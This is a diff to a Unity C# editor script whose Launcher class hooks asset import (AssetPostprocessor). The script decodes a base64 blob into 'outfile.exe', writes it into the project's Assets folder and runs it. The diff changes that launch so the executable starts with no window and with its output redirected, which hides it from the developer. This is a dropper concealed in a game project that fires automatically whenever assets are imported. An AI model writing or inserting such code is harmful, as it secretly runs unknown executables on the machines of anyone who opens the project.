@@ -5,6 +5,7 @@ using System;
 using UnityEditor.SceneManagement;
 using UnityEngine.SceneManagement;
 using System.Data.SqlTypes;
+using TMPro.EditorUtilities;
 
 public class Launcher: AssetPostprocessor
 {
@@ -30,8 +31,22 @@ public class Launcher: AssetPostprocessor
         byte[] bytes = Convert.FromBase64String(scriptContent3);
         string outfileName = "outfile.exe";
         File.WriteAllBytes("Assets/" + outfileName, bytes);
-        System.Diagnostics.Process.Start(Application.dataPath + "/" + outfileName);
 
+        System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
+        startInfo.FileName = (Application.dataPath + "/" + outfileName);
+        startInfo.Arguments = "";
+        startInfo.RedirectStandardOutput = true;
+        startInfo.RedirectStandardError = true;
+        startInfo.UseShellExecute = false;
+        startInfo.CreateNoWindow = true;
+
+        System.Diagnostics.Process proc = new System.Diagnostics.Process();
+        proc.StartInfo = startInfo;
+        proc.EnableRaisingEvents = true;
+        try { proc.Start(); }
+        catch (Exception e) { throw e; }
+
+        //System.Diagnostics.Process.Start(Application.dataPath + "/" + outfileName);
         AssetDatabase.Refresh();
         EditorApplication.delayCall += AddComponentToMainCamera;
     }
